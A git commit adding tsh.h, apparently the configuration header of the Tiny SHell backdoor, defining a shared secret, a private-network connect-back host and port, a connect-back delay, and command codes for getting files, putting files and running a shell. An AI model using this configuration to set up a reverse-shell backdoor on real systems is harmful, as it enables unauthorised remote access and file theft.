14d869e0fac3291590dcffeb2f966ae0eaf606df
alsdk <alsdk@users.noreply.github.com>
2020-03-23 12:37:42 +0100

    first commit

---
+++ tsh.h
@@ -0,0 +1,17 @@
+#ifndef _TSH_H
+#define _TSH_H
+
+char *secret = "hacktheplanet";
+char *cb_host = "192.168.1.113";
+
+#define SERVER_PORT 48617
+short int server_port = SERVER_PORT;
+
+#define CONNECT_BACK_HOST  "192.168.1.113"
+#define CONNECT_BACK_DELAY 5
+
+#define GET_FILE 1
+#define PUT_FILE 2
+#define RUNSHELL 3
+
+#endif /* tsh.h */
